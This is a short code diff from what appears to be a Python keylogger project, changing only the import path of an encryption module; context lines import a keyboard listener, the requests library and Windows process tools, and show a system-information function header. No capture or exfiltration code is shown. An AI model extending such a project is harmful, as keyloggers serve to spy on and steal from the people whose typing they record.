@@ -6,7 +6,7 @@ import win32process
 from pynput.keyboard import Listener, Key
 import requests
 import datetime
-from keylogger.Encryption import encryption
+from Encryption import encryption
 
 
 def get_system_info():
